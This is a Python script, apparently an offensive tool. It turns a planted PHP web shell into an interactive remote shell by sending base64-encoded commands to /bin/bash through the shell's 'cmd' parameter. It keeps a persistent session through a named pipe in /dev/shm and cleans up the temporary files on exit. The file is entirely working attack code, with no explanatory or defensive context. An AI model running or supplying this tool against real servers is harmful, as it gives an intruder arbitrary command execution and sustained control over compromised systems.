#!/usr/bin/python3

import time
import requests
import threading
from random import randint
from base64 import b64encode

# webshell url with cmd param
main_url = 'http://localhost/shell.php'

class ShellHttp():
    def __init__(self, url):
        self.url = url
        self.session = randint(100,999)
        self.input_file = f'/dev/shm/input.{self.session}'
        self.output_file = f'/dev/shm/output.{self.session}'
    
    def run_cmd(self, command:str):
        command = b64encode(command.encode()).decode()
        data = {'cmd':f'echo {command} | base64 -d | /bin/bash'}
        res = requests.get(self.url, params=data, timeout=3)
        return res.text.strip()
    
    def create_session(self):
        try:
            self.run_cmd(command=f"mkfifo '{self.input_file}' ; tail -f {self.input_file} | /bin/sh 2>&1 > {self.output_file}")
        except Exception as e:
            print(str(e))

    def write_in_file(self, command:str):
        self.run_cmd(f"echo '{command}' > {self.input_file}")

    def read_out_file(self):
        res = self.run_cmd(f'/bin/cat {self.output_file}')
        return res

    def del_fifo_files(self):
        self.run_cmd(f'rm {self.input_file} {self.output_file}')
        print('\n[*] deleted tmp files')

class TTYinteractive(ShellHttp):
    def __init__(self,url):
        super().__init__(url)

    def fake_shell(self):
        while True:
            command = input('|-> ')
            print(self.run_cmd(command))
    
    def loop_read_buffer(self, interval:int=1):
        def readf():
            while True:
                all_output = self.run_cmd(f'/bin/cat {self.output_file}')
                if all_output:
                    self.run_cmd(f'echo "" > {self.output_file}')
                    print(all_output)
                time.sleep(interval)
        
        threading.Thread(target=readf, daemon=True).start()

    def full_tty(self):
        self.create_session()
        self.loop_read_buffer()
        while True:
            command = input('$ ')
            self.write_in_file(command)
            time.sleep(1.1)

if __name__ == '__main__':
    tty = TTYinteractive(main_url)
    try:
        tty.full_tty() 
    except KeyboardInterrupt as e:
        tty.del_fifo_files()
        print('[x] exit')

